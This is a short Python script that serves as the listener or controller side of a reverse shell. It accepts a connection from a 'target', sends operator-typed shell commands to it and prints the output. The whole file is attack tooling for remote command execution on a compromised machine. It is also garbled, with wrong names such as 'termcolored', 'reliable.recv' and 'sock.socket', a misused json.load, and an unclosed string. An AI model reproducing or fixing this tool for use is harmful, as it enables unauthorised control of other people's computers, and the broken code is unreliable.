import socket
import termcolor
import json

def reliable_recv():
    data = ' '
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.load(data)
        except ValueError:
            continue


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def target_communication():
    while True:
        command = input(' Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        result = reliable.recv()
        print(result)

sock = sock.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 5555))
print(termcolored.color('[+] Listening for the incoming connections', 'green'))
sock.listen(5)
target, ip = sock.accept()
print(termcolored.color('[+] Target Connected from: ' + str(ip), 'green))
target.communication()
